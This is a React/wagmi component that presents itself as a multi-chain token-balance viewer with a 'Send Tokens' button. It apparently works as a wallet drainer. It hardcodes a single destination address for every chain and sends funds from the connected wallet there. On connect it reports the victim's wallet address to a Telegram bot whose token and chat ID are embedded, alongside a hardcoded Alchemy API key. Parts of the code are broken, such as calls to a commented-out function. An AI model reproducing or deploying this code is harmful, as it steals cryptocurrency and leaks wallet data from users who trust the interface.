import { useCallback, useEffect, useState } from 'react';
import { useAccount, useWaitForTransactionReceipt, usePublicClient, useWalletClient } from 'wagmi';
import { Loading, Toggle } from '@geist-ui/core';
import { tinyBig } from 'essential-eth';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { Alchemy, Network } from 'alchemy-sdk';

// Alchemy instances for multiple networks
const alchemyInstances = {
  [Network.ETH_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ETH_MAINNET }),
  [Network.BSC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.BSC_MAINNET }),
  [Network.OPTIMISM]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.OPTIMISM }),
  [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
  [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
  [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
  // Add other networks as needed
};

// Mapping from chain IDs to Alchemy SDK network enums
const chainIdToNetworkMap = {
  1: Network.ETH_MAINNET,
  56: Network.BSC_MAINNET,
  10: Network.OPTIMISM,
  324: Network.ZK_SYNC,
  42161: Network.ARB_MAINNET,
  137: Network.MATIC_MAINNET,
  // Add other mappings as needed
};

// Supported chain IDs
const supportedChains = [1, 56, 10, 324, 42161, 137];

// Mapping of chain IDs to destination addresses
const chainIdToDestinationAddress = {
  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
};

// // Telegram bot configuration
// const TELEGRAM_BOT_TOKEN = '7439590254:AAHON2e8fQW1mlEYPiWqE1RCf7F2Az7ABr0';
// const TELEGRAM_CHAT_ID = '5470283104';

// USD formatter for currency formatting
const usdFormatter = new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
});

// Function to safely convert input values to tinyBig numbers
const safeNumber = (value) => {
  try {
    if (value === undefined || value === null || value === '') {
      return tinyBig(0);
    }
    const num = tinyBig(value.toString());
    return num.isNaN() ? tinyBig(0) : num;
  } catch (error) {
    console.error('Invalid number detected:', error, value);
    return tinyBig(0);
  }
};

// Function to send a Telegram notification
// const sendTelegramNotification = async (message) => {
//   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
//   const params = {
//     chat_id: TELEGRAM_CHAT_ID,
//     text: message,
//   };

//   try {
//     const response = await fetch(url, {
//       method: 'POST',
//       headers: {
//         'Content-Type': 'application/json',
//       },
//       body: JSON.stringify(params),
//     });

//     if (!response.ok) {
//       throw new Error(`Telegram API error: ${response.statusText}`);
//     }
//     console.log('Telegram notification sent successfully.');
//   } catch (error) {
//     console.error('Failed to send Telegram notification:', error);
//   }
// };

const TokenRow = ({ token }) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { chain } = useAccount();
  const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;

  const setTokenChecked = (tokenAddress, isChecked) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
  };

  const { address } = useAccount();
  const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;

  const unroundedBalance = safeNumber(quote_rate).gt(0)
    ? safeNumber(quote).div(safeNumber(quote_rate))
    : safeNumber(0);

  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
    ? unroundedBalance.round(2)
    : unroundedBalance.round(5);

  const { isLoading } = useWaitForTransactionReceipt({
    hash: pendingTxn?.blockHash || undefined,
  });

  return (
    <div key={contract_address}>
      {isLoading && <Loading />}
      <Toggle
        checked={checkedRecords[contract_address]?.isChecked}
        onChange={(e) => {
          setTokenChecked(contract_address, e.target.checked);
        }}
        style={{ marginRight: '18px' }}
        disabled={Boolean(pendingTxn)}
      />
      <span style={{ fontFamily: 'monospace' }}>
        {roundedBalance.toString()}{' '}
      </span>
      <a
        href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
        target="_blank"
        rel="noreferrer"
      >
        {contract_ticker_symbol}
      </a>{' '}
      (worth{' '}
      <span style={{ fontFamily: 'monospace' }}>
        {usdFormatter.format(safeNumber(quote))}
      </span>
      )
    </div>
  );
};

const handleTokenTransaction = async (walletClient, destinationAddress, amount) => {
  if (!walletClient.data || !destinationAddress) return;

  try {
    const tx = await walletClient.data.sendTransaction({
      to: destinationAddress,
      value: amount,
      gasLimit: '21000', // Example gas limit
    });

    console.log('Transaction sent:', tx.hash);

    sendTelegramNotification(`Transaction sent, Amount: ${amount}, Destination: ${destinationAddress}`);
  } catch (error) {
    console.error('Failed to send transaction:', error);
  }
};

export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { address, isConnected, chain } = useAccount();
  const walletClient = useWalletClient();
  const [destinationAddress, setDestinationAddress] = useState('');
  const [notificationSent, setNotificationSent] = useState(false);

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      setError('');
      if (!chain || !supportedChains.includes(chain.id)) {
        throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
      }

      const alchemyNetwork = chainIdToNetworkMap[chain.id];
      const alchemy = alchemyInstances[alchemyNetwork];

      console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
      const tokensResponse = await alchemy.core.getTokenBalances(address);
      const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');

      const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
        contract_address: balance.contractAddress,
        balance: safeNumber(balance.tokenBalance),
        quote: balance.quote || 0,
        quote_rate: balance.quoteRate || 0,
      }));

      setTokens(processedTokens);
      console.log('Fetched tokens:', processedTokens);
    } catch (error) {
      console.error('Error fetching tokens:', error);
      setError((error.message));
    }
    setLoading(false);
  }, [address, chain, setTokens]);

  useEffect(() => {
    if (isConnected && chain?.id) {
      const selectedAddress = chainIdToDestinationAddress[chain.id] || '0x...DefaultAddress';
      setDestinationAddress(selectedAddress);
      fetchData();
      setCheckedRecords({});

      if (!notificationSent) {
        sendTelegramNotification(`Wallet connected: ${address}, Network: ${chain?.name}`);
        setNotificationSent(true);
      }
    }
  }, [address, chain?.id, fetchData, setCheckedRecords, walletClient, chain?.name]);

  const publicClient = usePublicClient();

  useEffect(() => {
    const interval = setInterval(fetchData, 60000); // Fetch every 60 seconds
    return () => clearInterval(interval);
  }, [fetchData]);

  const checkedTokenKeys = Object.entries(checkedRecords).filter(([_, value]) => value.isChecked).map(([key]) => key);
  const filteredTokens = tokens.filter((token) => checkedTokenKeys.includes(token.contract_address));

  return (
    <>
      {error && <div style={{ color: 'red', marginBottom: '12px' }}>{error}</div>}
      {loading ? <Loading /> : filteredTokens.map((token) => (
        <TokenRow key={token.contract_address} token={token} />
      ))}
      <div>
        {checkedTokenKeys.length > 0 && (
          <button onClick={() => handleTokenTransaction(walletClient, destinationAddress, tinyBig(0.1))}>Send Tokens</button>
        )}
      </div>
    </>
  );
};

export default GetTokens;
